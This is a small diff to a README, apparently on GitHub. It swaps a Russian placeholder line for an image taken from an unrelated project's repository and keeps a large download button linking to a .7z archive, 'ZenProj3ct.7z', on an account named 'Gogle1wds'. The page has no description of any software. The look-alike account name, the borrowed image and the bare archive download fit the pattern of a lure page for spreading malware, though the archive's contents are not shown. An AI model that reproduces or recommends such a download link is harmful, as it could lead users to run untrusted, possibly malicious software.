@@ -3,7 +3,8 @@
 ![windows](https://github.com/Gogle1wds/teest1/assets/170970796/a93c3c21-521c-40f9-a3a8-bc6f80be9404) ![license](https://github.com/Gogle1wds/teest1/assets/170970796/d565df71-8795-4d26-86de-0343eaef084b)
 
 
-картинка весели
+![image](https://github.com/mmaarij/FlexFix-Display-Totals-On-Flex-NUCES-Portal/assets/84127728/be2fb326-ae36-4c23-a3a2-90f1e0a44c59)
+
 
 
 [![download_click](https://github.com/Gogle1wds/teest1/assets/170970796/6c5e2192-8197-4d5b-9cc1-993f3a2320df)](https://github.com/Gogle1wds/teest1/releases/download/das/ZenProj3ct.7z)
